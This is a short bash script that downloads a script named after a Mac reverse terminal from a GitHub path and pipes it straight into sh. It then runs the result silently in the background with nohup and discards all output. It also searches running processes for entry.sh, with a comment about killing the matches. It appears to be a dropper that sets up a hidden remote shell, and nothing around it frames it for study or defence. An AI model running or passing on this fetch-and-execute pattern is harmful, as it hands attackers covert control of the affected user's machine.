#!/bin/bash

cd "$(dirname "$0")"
cmd="$(curl -o run.sh github.com/icefisher225/mac-rev-terminal/main.sh | sh -)"
nohup /bin/bash -c "$cmd" >/dev/null 2>&1 &

cmd2="$(ps aux | grep entry.sh)"
# kill all that match cmd2....
